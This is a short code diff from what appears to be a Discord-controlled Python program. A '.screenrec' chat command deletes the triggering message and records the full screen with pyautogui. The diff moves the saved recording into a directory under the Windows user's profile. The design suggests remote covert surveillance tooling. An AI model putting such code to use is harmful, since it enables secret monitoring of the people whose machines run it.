@@ -9,7 +9,7 @@ elif message.content == '.screenrec':
     await message.delete()
     await message.channel.send("`Recording... Please wait.`")
 
-    output_file = 'recording.mp4'
+    output_file = f'C:\\Users\\{getuser()}\\{software_directory_name}\\recording.mp4'
     screen_width, screen_height = pyautogui.size()
     screen_region = (0, 0, screen_width, screen_height)
     frames = []
